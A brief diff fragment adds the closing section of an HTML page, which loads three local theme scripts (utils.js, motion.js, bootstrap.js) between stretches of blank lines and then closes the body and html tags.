+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+</body>
+</html>
